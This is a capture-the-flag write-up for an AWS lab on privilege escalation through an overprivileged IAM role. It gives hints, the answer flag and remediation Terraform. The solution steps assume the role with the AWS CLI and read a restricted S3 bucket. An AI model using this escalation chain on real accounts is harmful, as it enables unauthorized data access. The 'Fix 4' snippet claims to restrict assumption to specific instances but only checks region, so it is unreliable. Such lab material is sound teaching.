# Challenge 02: Overprivileged IAM Role

**Difficulty:** 🟡 Medium  
**Category:** Identity & Access Management  
**MITRE ATT&CK:** [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) + [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)

---

## 🎯 Objective

You've obtained credentials for a low-privilege IAM user (`ctf-02-attacker`). The environment has an EC2 role with misconfigured permissions. Escalate your privileges and retrieve the flag from a restricted S3 bucket.

---

## 🌍 Setup

```bash
cd challenges/02-overprivileged-iam/terraform
terraform init && terraform apply

# Configure the attacker credentials
aws configure --profile ctf-attacker
# Enter the access key and secret from terraform output
```

---

## 💡 Hints

<details>
<summary>Hint 1</summary>
Start by understanding what your attacker user can do. Use `aws iam simulate-principal-policy` or just try listing available roles.
</details>

<details>
<summary>Hint 2</summary>
The EC2 role has a very permissive policy. Can your attacker user assume it? Check the role's trust policy.
</details>

<details>
<summary>Hint 3</summary>
Use `sts:AssumeRole` to assume the overprivileged EC2 role. Once you have those credentials, you'll have much broader access than your original user.
</details>

---

## ✅ Solution

### Step 1 — Enumerate as the attacker user

```bash
# See what roles exist
aws iam list-roles --profile ctf-attacker --query 'Roles[?contains(RoleName, `ctf-02`)].{Name:RoleName,Arn:Arn}'
```

### Step 2 — Inspect the role's policy

```bash
# List attached policies on the role
aws iam list-attached-role-policies \
  --role-name <vulnerable_role_name> \
  --profile ctf-attacker

# Get the policy document
aws iam get-policy-version \
  --policy-arn <policy_arn> \
  --version-id v1
```

You'll notice: `iam:*` and `s3:*` — way more than an EC2 instance needs.

### Step 3 — Assume the overprivileged role

```bash
aws sts assume-role \
  --role-arn <vulnerable_role_arn> \
  --role-session-name ctf-escalation \
  --profile ctf-attacker
```

Export the returned credentials:

```bash
export AWS_ACCESS_KEY_ID=<returned_key>
export AWS_SECRET_ACCESS_KEY=<returned_secret>
export AWS_SESSION_TOKEN=<returned_token>
```

### Step 4 — Access the restricted S3 bucket

```bash
# List the flag bucket
aws s3 ls s3://<flag_bucket_name>/secret/

# Read the flag
aws s3 cp s3://<flag_bucket_name>/secret/flag.txt -
```

🚩 **Flag:** `CTF{iam_privilege_escalation_via_overprivileged_role}`

---

## 🔍 MITRE ATT&CK Mapping

| Field | Detail |
|---|---|
| Tactic | Privilege Escalation, Lateral Movement |
| Technique | T1078.004 — Valid Accounts: Cloud Accounts |
| Technique | T1548 — Abuse Elevation Control Mechanism |
| Detection | CloudTrail: `AssumeRole` events, unexpected `s3:GetObject` from role sessions |

---

## 🛠️ Remediation

### Fix 1 — Apply least privilege to the IAM policy

Replace the wildcard policy with only what the role actually needs:

```hcl
resource "aws_iam_policy" "least_privilege" {
  name = "ec2-least-privilege"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid      = "EC2ReadOnly"
        Effect   = "Allow"
        Action   = ["ec2:DescribeInstances", "ec2:DescribeTags"]
        Resource = "*"
      }
      # No IAM permissions. No S3 permissions unless explicitly needed.
    ]
  })
}
```

### Fix 2 — Add a permission boundary

```hcl
resource "aws_iam_role" "safe_ec2_role" {
  name                 = "safe-ec2-role"
  permissions_boundary = aws_iam_policy.boundary.arn

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })
}
```

### Fix 3 — Use IAM Access Analyzer

```bash
# Generate least-privilege policy based on actual CloudTrail usage
aws accessanalyzer start-policy-generation \
  --policy-generation-details '{"principalArn": "<role_arn>"}' \
  --cloud-trail-details '{"trails": [{"cloudTrailArn": "<trail_arn>", "regions": ["us-east-1"]}], "startTime": "2024-01-01T00:00:00Z", "endTime": "2024-12-31T00:00:00Z"}'
```

### Fix 4 — Restrict AssumeRole with condition

Only allow the role to be assumed from specific EC2 instances:

```json
{
  "Effect": "Allow",
  "Principal": { "Service": "ec2.amazonaws.com" },
  "Action": "sts:AssumeRole",
  "Condition": {
    "StringEquals": {
      "aws:RequestedRegion": "us-east-1"
    }
  }
}
```

---

## 📚 Further Reading

- [IAM Permission Boundaries](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html)
- [IAM Access Analyzer Policy Generation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-policy-generation.html)
- [MITRE T1078.004](https://attack.mitre.org/techniques/T1078/004/)
